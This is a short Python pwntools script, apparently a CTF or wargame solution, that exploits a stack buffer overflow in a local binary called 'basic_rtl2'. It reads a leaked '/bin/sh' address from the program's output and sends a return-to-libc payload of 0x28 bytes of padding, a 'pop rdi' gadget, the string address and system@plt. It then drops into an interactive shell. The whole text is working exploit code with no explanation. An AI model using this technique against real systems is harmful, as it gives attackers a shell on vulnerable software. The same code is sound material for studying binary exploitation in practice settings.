from pwn import *

p = process('./basic_rtl2')
e = ELF('./basic_rtl2')
l = e.libc

p.recvuntil('/bin/sh addr : ')

prdi = 0x00000000004007c3
system = e.plt['system']

s = int(p.recvline().replace("\n",''),16)
print hex(s)

payload = "A"*0x28
payload += p64(prdi)
payload += p64(s)
payload += p64(system)

p.sendline(payload)
p.interactive()
